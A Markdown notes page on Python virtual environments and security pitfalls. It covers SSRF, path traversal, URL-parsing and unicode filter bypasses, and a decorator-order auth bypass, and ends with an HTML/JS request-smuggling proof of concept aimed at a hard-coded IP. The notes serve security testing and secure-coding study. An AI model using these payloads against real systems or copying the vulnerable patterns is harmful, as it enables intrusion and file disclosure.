# Building and command line

### venv

- Create the v environment
    - If --system-site-packages is specified , a link to external packages is created aswell as the standard library

```bash
$ python3 -m venv venv-name/   --system-site-packages
```


- Activate the venv (being in the folder venv-name/ is created)

```bash
$ source venv/bin/activate
(venv) $
```


- Install packages in it 

`(venv) $ python -m pip install <package-name>`

- Deactivate it

```bash
(venv) $ deactivate
$
```

### virtualenv

```bash
$ virtualenv venv/


$ source venv/bin/activate
(venv) $
```

- Change the python version

` $ virtualenv venv/ -p {Path_to_binary}`


- Deactivate

` $ deactivate`




# Python Tricks

## ipaddress.IPv4Address()

- IPv4Address performs ip normaliation which could lead to ssrf vulnerabilities if invoked after blacklist checks

```python
def send_request(request):
    ip = request.GET["ip"]
    try:
        if ip in ["127.0.0.1", "0.0.0.0"]:
            return HttpResponse("Not allowed")
        ip = str(ipaddress.IPv4Address(ip))
    except ipaddress.AddressValueError:
        return HttpResponse("Error at validation!")
    requests.get("https://" + ip)
    return HttpResponse("Request send!")

ip = '127.00.0.1'
ip = '127.1'
```

## re.match vs re.search

- re.match only sanitizes the first line
- everything after a `\n` passes the re.match sanitization

```python
>>> comp = re.compile(".*(abc)|(cba).*")
>>> re.search(comp,'aaa\nabc')
<re.Match object; span=(4, 7), match='abc'>
>>> re.match(comp,'aaa\nabc')
```

## tempfile.NamedTemporaryFile

- used to create temporary files with a specific name
- prefix and suffix parameters are vulnerable to a path traversal attack

```python
def touch_tmp_file(request):
    id = request.GET["id"]
    tmp_file = tempfile.NamedTemporaryFile(prefix=id)
    return HttpResponse(f"tmp file: {tmp_file} created!", content_type="text/plain")
id = '/../var/www/test'
```
## urllib vs requests/urllib3

- You can try adding an extra `\` when injecting in a string to escape the already existand one.

```python
>>> urllib.parse.urlparse('http://google.com\@python.com').hostname
'python.com'

>>>requests.get('http://google.com\@python.com') # fetches google.com
```


## os.path.join(path, / , *paths)

- Returns a concatenation of path with paths.

- If one of the *paths variable of os.path.join(path,/,*paths) is absolute path , the return value has this as a basedir and the previous paths are ignored, including the first variable path.


```python
>>>os.path.join('/home/','/etc/passwd/')
/etc/passwd
```

```python
>>> os.path.join('http://127.0.0.1:8000','http://attacker.com')
http://attacker.com
```

## pathlib.Path
- Purepath.joinpath has a similar functionality

```python
from pathlib import Path
payload = "/etc/passwd"

file = Path("/var/www/html").joinpath("files", payload)

with open(file, "r") as f:
   print(f.read()) # print the “/etc/passwd” file content
```

## urllib.parse.urljoin

- Similarly the urljoin can be used to concatenate a base url component with a relative one

- If the second parameter is an absolute url though, the output result is this parameter as is.Some absolute url are:
    - //url
    - scheme://url

```python
>>> from urllib.parse import urljoin

>>> urljoin('http://www.cwi.nl/%7Eguido/Python.html', 'FAQ.html')
'http://www.cwi.nl/%7Eguido/FAQ.html'

>>>urljoin('http://www.example.com/b',
            '//www.attacker.com/a')
"http://www.attacker.com/a"
```

## urllib.parse.urlsplit vs urllib.request.urlretrieve

- urlretrive supports an odd URL format : `<URL:scheme://host:port?/path?>`
- Attackers can bypass scheme blacklisting when these two methods used inline

```python
>>> urllib.parse.urlsplit("<URL:http://www.google.com>")
SplitResult(scheme='', netloc='', path='<URL:http://www.google.com>', query='', fragment='')
```

```python
>>> a,b = urllib.request.urlretrieve("<URL:http://google.com>")
>>> b
<http.client.HTTPMessage object at 0x7f9426cc7d90>
```

## String encoding

[pydocs](https://docs.python.org/3/howto/unicode.html)

- One possible option to bypass wafs and restrictions or filters in strings is by using benign string encoding

- If your input is passed in a string literal , python might intepret some characters encoded in other than the usual utf-8 , in a way that it downgrades to utf-8(default encoding in python) eventually

-  Examples :

```python
>>>"\N{GREEK CAPITAL LETTER DELTA}"  # Using the character name
'\u0394'

>>>"\u0394"                          # Using a 16-bit hex value
'\u0394'

>>>"\U00000394"                      # Using a 32-bit hex value
'\u0394'
```

#### Abusing IDNA Standard



```python
>> "ß".toLowerCase()
"ß"
>> "ß".toUpperCase()
"SS"
>> ["ss", "SS"].indexOf("ß")
false
>> location.href = "http://wordpreß.com"
```


# Python gotchas


### Cathing Errors

- Trying to catch multiple exceptions in the same exception with a boolean expression of exceptions may not work as intended

- A boolean expression of exceptions results in a single exception class;

- using a boolean expression in an except block will result in catching only one kind of exception 

```python
error = ValueError or TypeError

error is ValueError # True

error is TypeError # False

error = ValueError and TypeError

error is ValueError # False

error is TypeError # True
```


### Decorator`s order 


- In Python, decorators apply bottom-to-top

- So in the above flask example, the login check never applies to incoming requests , as @login_required wraps that function after the app.route(), but Flask already stored a reference to the unwrapped version.

```python
@login_required 

@app.get('/api/document') 

def handle_document():
    ...
    f = open('report.pdf', 'rb')
    return send_file(f)
```





# Python Desync Attacks

- Similar to Request smuggling attacks
- If a python web server responds with a 4XX,5XX in a POST Requests before handling body
- But it doesnt terminates the connection, and responding with `Connection: close`
- The body of the first Request [might end up](https://mizu.re/post/twisty-python) desyncing the server and smuggle a new request.

[Sudistark writeups](https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md#challenge-2-by-ryotkak)

```python
class RequestHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    content_type_text = 'text/plain; charset=utf-8'
    content_type_html = 'text/html; charset=utf-8'

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length'))
        if content_length > 100:
            self.send_response(413)
            self.send_data(self.content_type_text, b'Post is too large')
            return
        body = self.rfile.read(content_length)
        draft_id = str(uuid4())
        drafts[draft_id] = body.decode('utf-8')
        self.send_response(200)
        self.send_data(self.content_type_text, bytes(draft_id, 'utf-8'))

    def send_data(self, content_type, body):
        self.send_header('Content-Type', content_type)
        self.send_header('Connection', 'keep-alive')
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)
```

```html
<form action="http://34.171.202.118/" method="POST" enctype="text/plain" target="shirley">
    <textarea name="http"></textarea>
</form>

<script>
    document.forms[0].http.name = `GET /shirley HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
    setTimeout('document.forms[0].submit()',3000)
</script>
```